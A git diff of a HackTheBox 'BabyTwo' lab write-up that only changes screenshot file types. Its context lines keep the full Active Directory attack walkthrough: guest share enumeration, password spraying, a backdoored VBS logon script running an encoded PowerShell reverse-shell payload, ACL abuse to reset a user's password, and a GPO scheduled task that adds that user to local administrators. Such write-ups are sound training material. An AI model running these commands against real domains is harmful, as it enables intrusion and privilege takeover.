@@ -17,7 +17,7 @@ title: 'HTB Write up BabyTwo'
 ---
 # [HackTheBox - BabyTwo](https://app.hackthebox.com/machines/BabyTwo)
 
-![8da3981f5bc5e3d53775b749202dda51.png](/assets/resources-writeups/8da3981f5bc5e3d53775b749202dda51.png)
+![8da3981f5bc5e3d53775b749202dda51.png](/assets/resources-writeups/8da3981f5bc5e3d53775b749202dda51.avif)
 
 ## Table of Contents
 
@@ -38,89 +38,89 @@ After gaining foothoold, the bloodhound result telling us that  "Amelia.Griffith
 
 I start with nmap without any flag to quickly scan well-known port which we can see that this machine is a domain controller and there is no website to explore as well.
 
-![7d3b76d85c10f405ee283dbcaceeaa3b.png](/assets/resources-writeups/7d3b76d85c10f405ee283dbcaceeaa3b.png)
+![7d3b76d85c10f405ee283dbcaceeaa3b.png](/assets/resources-writeups/7d3b76d85c10f405ee283dbcaceeaa3b.avif)
 
 I rerun my scan again with `-sCV` for service enumeration and nmap script engine which reveals hostname that we can add to hosts file and then we can use these hostname instead of IP address unless needed.
 
-![aa0eea0c1c878bddcf0fa87b793dddb5.png](/assets/resources-writeups/aa0eea0c1c878bddcf0fa87b793dddb5.png)
+![aa0eea0c1c878bddcf0fa87b793dddb5.png](/assets/resources-writeups/aa0eea0c1c878bddcf0fa87b793dddb5.avif)
 
 Since there is no website to explore, I use NetExec to test null session on SMB and LDAP but we can see that null session could not be used to list users or shares here. 
 
-![7cf5f6f09cd1e6a2598cf421375b065c.png](/assets/resources-writeups/7cf5f6f09cd1e6a2598cf421375b065c.png)
+![7cf5f6f09cd1e6a2598cf421375b065c.png](/assets/resources-writeups/7cf5f6f09cd1e6a2598cf421375b065c.avif)
 
 However guest user is enabled on this domain and can be used to read "apps" share and can even write "homes" shares
 ```
 nxc smb baby2.vl -u 'guest' -p '' --shares
 ```
-![6fb7d1188bbc4360afe54074d199317b.png](/assets/resources-writeups/6fb7d1188bbc4360afe54074d199317b.png)
+![6fb7d1188bbc4360afe54074d199317b.png](/assets/resources-writeups/6fb7d1188bbc4360afe54074d199317b.avif)
 
 In the apps share, we can see a shortcut file of `login.vbs` file incidating there might be a logon script on this machine
 ```
 smbclient \\\\baby2.vl\\apps -N -L
 ```
-![e65cc2082bf62590224838b7229d1ed8.png](/assets/resources-writeups/e65cc2082bf62590224838b7229d1ed8.png)
+![e65cc2082bf62590224838b7229d1ed8.png](/assets/resources-writeups/e65cc2082bf62590224838b7229d1ed8.avif)
 
 After reading `CHANGELOG` file, we can now confirm that there is a logon script on this domain controller but we need to know its path so we can modify it if we get a valid domain user credential.
 
-![dd1b20d40ae524a24231404e52616d43.png](/assets/resources-writeups/dd1b20d40ae524a24231404e52616d43.png)
+![dd1b20d40ae524a24231404e52616d43.png](/assets/resources-writeups/dd1b20d40ae524a24231404e52616d43.avif)
 
 We can also read the content of the shortcut file which reveals that this script is located inside `scripts` folder inside SYSVOL which we will be able to read it once we get valid domain user credential.
-![39a1c3fc126c1251a426da3bdfbc8249.png](/assets/resources-writeups/39a1c3fc126c1251a426da3bdfbc8249.png)
+![39a1c3fc126c1251a426da3bdfbc8249.png](/assets/resources-writeups/39a1c3fc126c1251a426da3bdfbc8249.avif)
 
 On the homes share, We can see list of users on this machine but we can not look inside any of these folders since We are just merely a guest.
 ```
 smbclient \\\\baby2.vl\\homes -N -L
 ```
-![da7c594f6120425f3585c242cfc338e7.png](/assets/resources-writeups/da7c594f6120425f3585c242cfc338e7.png)
+![da7c594f6120425f3585c242cfc338e7.png](/assets/resources-writeups/da7c594f6120425f3585c242cfc338e7.avif)
 
 But since guest can enumerate share then it can also be used to pull user list via RID cycling method as well.
 ```
 nxc smb baby2.vl -u 'guest' -p '' --rid-brute
 ```
-![67e425e4616704aec2b2ef16f9433cbc.png](/assets/resources-writeups/67e425e4616704aec2b2ef16f9433cbc.png)
+![67e425e4616704aec2b2ef16f9433cbc.png](/assets/resources-writeups/67e425e4616704aec2b2ef16f9433cbc.avif)
 
 Now we add them to a text file so we can start password spraying if we find one.
 ```
 nxc smb baby2.vl -u 'guest' -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
 ```
-![bdde57c629cb3abd871317fee78ad294.png](/assets/resources-writeups/bdde57c629cb3abd871317fee78ad294.png)
+![bdde57c629cb3abd871317fee78ad294.png](/assets/resources-writeups/bdde57c629cb3abd871317fee78ad294.avif)
 
 But since there is no other place I could look for, I use NetExec to test if there is any user that used their username as a password which I found 2 users here and they are "Carl.Moore" and "library" users
 ```
 nxc smb baby2.vl -u users -p users --no-bruteforce --continue-on-success
 ```
-![c4a3b34162893dadec3220892bad3d7e.png](/assets/resources-writeups/c4a3b34162893dadec3220892bad3d7e.png)
+![c4a3b34162893dadec3220892bad3d7e.png](/assets/resources-writeups/c4a3b34162893dadec3220892bad3d7e.avif)
 
 And now since I have 2 valid users, I will use it to look up to login script on the SYSVOL share. One more thing to notice here is after using NetExec to list shares that both users can access, I noticed "docs" share that have not been found before so I took a look and found nothing.
 ```
 nxc smb baby2.vl -u library -p library --shares
 nxc smb baby2.vl -u Carl.Moore -p Carl.Moore --shares
 ```
-![8edbba99af81a9b145aca186be75d362.png](/assets/resources-writeups/8edbba99af81a9b145aca186be75d362.png)
+![8edbba99af81a9b145aca186be75d362.png](/assets/resources-writeups/8edbba99af81a9b145aca186be75d362.avif)
 
 Before checking SYSVOL share,I will use bloodhound python to collect domain information and plot them in Bloodhound Community Edition.
 ```
 bloodhound-python -u 'library' -p 'library' -d baby2.vl -c all -ns 10.129.200.216 --zip
 ```
-![ac280d4423e7f4f65c249271a6e74c4a.png](/assets/resources-writeups/ac280d4423e7f4f65c249271a6e74c4a.png)
+![ac280d4423e7f4f65c249271a6e74c4a.png](/assets/resources-writeups/ac280d4423e7f4f65c249271a6e74c4a.avif)
 
 On the bloodhound show that Amelia.Griffiths user have the logon script we just found from the share earlier so if we able to edit this script to add a reverse shell command to us, we will be given a shell as this user. 
 
-![710c9cd5fec368e3b8c9622008fde8eb.png](/assets/resources-writeups/710c9cd5fec368e3b8c9622008fde8eb.png)
+![710c9cd5fec368e3b8c9622008fde8eb.png](/assets/resources-writeups/710c9cd5fec368e3b8c9622008fde8eb.avif)
 
 First I grab get `login.vbs` script from SYSVOL using one of valid user credential.
 ```
 smbclient \\\\baby2.vl\\SYSVOL -U Carl.Moore%Carl.Moore
 ```
-![bf712b46b30250f7bf5988742d42c158.png](/assets/resources-writeups/bf712b46b30250f7bf5988742d42c158.png)
+![bf712b46b30250f7bf5988742d42c158.png](/assets/resources-writeups/bf712b46b30250f7bf5988742d42c158.avif)
 
 This script will just map network share to a drive but first we need to confirm if we could really write anything to scripts folder so if not, the all modification would be in vain. 
 
-![9ead6f1e0b7d3130b0e6ae3bfd7b5077.png](/assets/resources-writeups/9ead6f1e0b7d3130b0e6ae3bfd7b5077.png)
+![9ead6f1e0b7d3130b0e6ae3bfd7b5077.png](/assets/resources-writeups/9ead6f1e0b7d3130b0e6ae3bfd7b5077.avif)
 
 I test by uploading a blank file and turn out we can actually write anything in SYSVOL despite NetExec telling us we only have READ permission
 
-![527c3f1585da50a2861c9311b8dba2e0.png](/assets/resources-writeups/527c3f1585da50a2861c9311b8dba2e0.png)
+![527c3f1585da50a2861c9311b8dba2e0.png](/assets/resources-writeups/527c3f1585da50a2861c9311b8dba2e0.avif)
 
 The reason why we can write to SYSVOL is because there are 2 level of permissions on the shares folder, one is Share permission and other is NTFS file-system permission and the NetExec and other various SMB tool can only check for Share permission but not file-system permission but this case is also not normal since in normal circumstance, only administrator-level user have write access to SYSVOL folder/share.
 
@@ -134,7 +134,7 @@ set uripath chicken
 set target 2
 run
 ```
-![f3165242c0b2cd1358211d13baddf404.png](/assets/resources-writeups/f3165242c0b2cd1358211d13baddf404.png)
+![f3165242c0b2cd1358211d13baddf404.png](/assets/resources-writeups/f3165242c0b2cd1358211d13baddf404.avif)
 
 Add the following code into the script and now we are ready for the attack.
 ```
@@ -143,33 +143,33 @@ Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell -e ..." , 0, False
 Set objShell = Nothing
 ```
-![3016da60ff064183ee9e0cf0ebc9cf1b.png](/assets/resources-writeups/3016da60ff064183ee9e0cf0ebc9cf1b.png)
+![3016da60ff064183ee9e0cf0ebc9cf1b.png](/assets/resources-writeups/3016da60ff064183ee9e0cf0ebc9cf1b.avif)
 
 I delete the original and upload the new one instead, now I will have to wait until "Amelia.Griffiths" logon event occurs to trigger the script.
 
-![67a28516887dc05ab9a2dc11adf5220d.png](/assets/resources-writeups/67a28516887dc05ab9a2dc11adf5220d.png)
+![67a28516887dc05ab9a2dc11adf5220d.png](/assets/resources-writeups/67a28516887dc05ab9a2dc11adf5220d.avif)
 
 And I did not have to wait long. Only a brief moment, Metasploit was deliverying a payload and now I have access to the machine as Amelia.Griffiths.
 
-![60255f8ff2fbbd44259124f78774b223.png](/assets/resources-writeups/60255f8ff2fbbd44259124f78774b223.png)
+![60255f8ff2fbbd44259124f78774b223.png](/assets/resources-writeups/60255f8ff2fbbd44259124f78774b223.avif)
 
 Go to C:\ to loot user flag and then we can go back to Bloodhound if we could do anything about this account.
 
-![b590cf220c19a954e4654d24d26d6b1d.png](/assets/resources-writeups/b590cf220c19a954e4654d24d26d6b1d.png)
+![b590cf220c19a954e4654d24d26d6b1d.png](/assets/resources-writeups/b590cf220c19a954e4654d24d26d6b1d.avif)
 
 ## Privilege Escalation via Changing User password and GPO Abuse
 
 After checking the outbound control edge to Amelia.Griffiths, I found that this user is a member of "Legacy" group which have "WriteOwner" and "WriteDACL" to GPOADM (GPO Admin) user and that mean we can make "Amelia.Griffiths" a new owner of GPOADM user and change its password but what's next after that? 
 
-![0852cd73182c47a62e462c43394aa0de.png](/assets/resources-writeups/0852cd73182c47a62e462c43394aa0de.png)
+![0852cd73182c47a62e462c43394aa0de.png](/assets/resources-writeups/0852cd73182c47a62e462c43394aa0de.avif)
 
 The GPOADM user have GenericAll to 2 default GPOs which we can abuse this by configure group policy with our desired setting but the most easiest choice is to run GPO Immediate Scheduled task with our command to make ourselves administrators although this is very bad obsec in any production environment but it is the most convenient one for this machine
 
-![e56141b444baba0b1af6ba8f9595ca17.png](/assets/resources-writeups/e56141b444baba0b1af6ba8f9595ca17.png)
+![e56141b444baba0b1af6ba8f9595ca17.png](/assets/resources-writeups/e56141b444baba0b1af6ba8f9595ca17.avif)
 
 I also confirm that I can abuse either of them to make  GPOADM a new local administrator after chaning its password and sure enough that both GPO are linked to the domain and will take effect on the machine. and I also grab the object ID of this GPO here which will be used to specify which GPO to abuse later after taking control of GPOADM (that's {318...} one in Distinguished Name field)
 
-![21c02d0a78ecccc676b19d90c209befd.png](/assets/resources-writeups/21c02d0a78ecccc676b19d90c209befd.png)
+![21c02d0a78ecccc676b19d90c209befd.png](/assets/resources-writeups/21c02d0a78ecccc676b19d90c209befd.avif)
 
 First, I need to "Amelia.Griffiths" a new owner of GPOADM user and change its password which I use PowerViews because I did not obtain a password of this user but using logon script to get a reverse shell so remote tool like impacket and bloodyAD is not suitable here
 
@@ -184,29 +184,29 @@ Add-DomainObjectAcl -Rights 'All' -TargetIdentity "GPOADM" -PrincipalIdentity "A
 $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
 Set-DomainUserPassword -Identity 'GPOADM' -AccountPassword $NewPassword
 ```
-![9cec944fa143c8368b27a33c5f0b2be7.png](/assets/resources-writeups/9cec944fa143c8368b27a33c5f0b2be7.png)
+![9cec944fa143c8368b27a33c5f0b2be7.png](/assets/resources-writeups/9cec944fa143c8368b27a33c5f0b2be7.avif)
 
 After changing password, I confirm it with NetExec and now we have full control over GPOADM user. 
 
-![f0a77a0ac133eb5685d50b833f16f163.png](/assets/resources-writeups/f0a77a0ac133eb5685d50b833f16f163.png)
+![f0a77a0ac133eb5685d50b833f16f163.png](/assets/resources-writeups/f0a77a0ac133eb5685d50b833f16f163.avif)
 
 After that I use [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse), this tool is a partial implementation of [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) which allow me to remotely run GPO immediate scheduled task without having a shell as GPOADM user which I use with net localgroup command to add GPOADM user to local administrators group.
 ```
 python pygpoabuse.py baby2.vl/GPOADM:'Password1234' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -command 'net localgroup administrators GPOADM /add' -f
 ```
-![bb2fd7d83c54d336b2c8729b16fb15eb.png](/assets/resources-writeups/bb2fd7d83c54d336b2c8729b16fb15eb.png)
+![bb2fd7d83c54d336b2c8729b16fb15eb.png](/assets/resources-writeups/bb2fd7d83c54d336b2c8729b16fb15eb.avif)
 
 After a while, I check the local administrators group from my reverse shell session and we can see that GPOADM was successfully added to local administrators group as planned
 
-![b45cb23e2aefd8976cd6c4f5eb641fa9.png](/assets/resources-writeups/b45cb23e2aefd8976cd6c4f5eb641fa9.png)
+![b45cb23e2aefd8976cd6c4f5eb641fa9.png](/assets/resources-writeups/b45cb23e2aefd8976cd6c4f5eb641fa9.avif)
 
 We can now login as GPOADM and loot the root flag :D
 ```
 evil-winrm -i baby2.vl -u GPOADM -p 'Password1234' 
 ```
-![584b6addd03c8f0797c88ec051003313.png](/assets/resources-writeups/584b6addd03c8f0797c88ec051003313.png)
+![584b6addd03c8f0797c88ec051003313.png](/assets/resources-writeups/584b6addd03c8f0797c88ec051003313.avif)
 
-![442d28c2be6d83237da75ef6c4e00e5f.png](/assets/resources-writeups/442d28c2be6d83237da75ef6c4e00e5f.png)
+![442d28c2be6d83237da75ef6c4e00e5f.png](/assets/resources-writeups/442d28c2be6d83237da75ef6c4e00e5f.avif)
 
 https://labs.hackthebox.com/achievement/machine/1438364/746
 ***
